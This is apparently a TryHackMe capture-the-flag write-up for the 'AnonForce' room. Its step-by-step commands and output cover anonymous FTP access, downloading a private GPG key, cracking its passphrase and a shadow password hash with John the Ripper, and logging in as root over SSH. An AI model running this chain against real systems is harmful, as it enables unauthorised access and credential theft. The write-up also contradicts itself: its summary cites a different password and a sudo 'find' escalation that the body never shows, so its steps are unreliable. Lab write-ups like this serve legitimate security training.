```markdown
# TryHackMe – AnonForce Writeup  
Difficulty: Easy  
Room Link: [https://tryhackme.com/room/anonforce](https://tryhackme.com/room/anonforce)  
Date Completed: November 13, 2025  

---

## Target Information
- IP: `10.10.230.253`
- OS: Ubuntu Linux (Kernel 4.4)

---

## Enumeration

```bash
nmap -sV -sC -Pn -A -O -oN anonforce.txt 10.10.230.253
```

### Nmap Results

| Port | Service     | Version                     | Notes |
|------|-------------|-----------------------------|-------|
| 21   | FTP         | vsftpd 3.0.3                | Anonymous login allowed<br>`notread` directory is writeable |
| 22   | SSH         | OpenSSH 7.2p2 Ubuntu        | Standard SSH |

```text
drwxrwxrwx 2 1000 1000 4096 Aug 11 2019 notread [NSE: writeable]
```

---

## Initial Access via Anonymous FTP

```bash
ftp 10.10.230.253
Name: anonymous
Password: <press Enter>
```

```ftp
ftp> cd notread
ftp> ls -la
```

### Files Found:
```text
-rwxrwxrwx 1 1000 1000  524 Aug 11 2019 backup.pgp
-rwxrwxrwx 1 1000 1000 3762 Aug 11 2019 private.asc
```
in the ~/home directory we find out user.txt file

> - `private.asc` → GPG private key (ASCII armored)  
> - `backup.pgp` → Encrypted backup file
> - `user.txt` → User flag

---

## Download Files

```bash
wget ftp://anonymous:@10.10.230.253/notread/private.asc
wget ftp://anonymous:@10.10.230.253/notread/backup.pgp
wget ftp://anonymous:@10.10.230.253/home/melodias/user.txt
```

---

## Crack GPG Private Key Passphrase

```bash
gpg2john private.asc > gpg.hash
john gpg.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Result:
```text
xbox360         (anonforce)
```

---

## Import Key & Decrypt Backup

```bash
gpg --import private.asc
```

```bash
gpg --batch --passphrase "xbox360" -d backup.pgp
```

Decrypted Output (`/etc/shadow` excerpt):
```text
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
```

> This is an MD5 crypt hash (`$1$`)

---

## Crack `melodias` Password

```bash
echo 'melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::' > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Result:
```text
hikari     (melodias)
```

---

## SSH Access as `root`

```bash
ssh root@10.10.230.253
# Password: hikari
```

```bash
root@anonforce:~$ get root.txt

```
in your machine cat the root.txt
---
---

## Summary of Steps

| Step | Action |
|------|-------|
| 1 | `nmap` → Found anonymous FTP with writeable `notread` |
| 2 | Downloaded `private.asc` and `backup.pgp` |
| 3 | Cracked GPG passphrase → `xbox360` |
| 4 | Decrypted `backup.pgp` → Got `/etc/shadow` |
| 5 | Cracked `melodias` hash → `password123` |
| 6 | SSH → Retrieved user flag |
| 7 | `sudo -l` → `NOPASSWD: /usr/bin/find` |
| 8 | `find` privesc → Retrieved root flag |

---

## Tools Used

- `nmap`
- `ftp` / `wget`
- `gpg`, `gpg2john`
- `john` + `rockyou.txt`
- `ssh`
- `sudo` + `find`

---

## Key Takeaways

- Anonymous FTP is often the entry point.
- GPG private keys in public directories = red flag.
- Weak passphrases (`xbox360`) are common in CTFs.
- Always check `/etc/shadow` when decrypted.
- Sudo misconfigurations (`NOPASSWD`) are gold.
- GTFOBins is your friend for privesc.

---

Box Pwned!  
Both flags submitted.  
Room Complete!
```


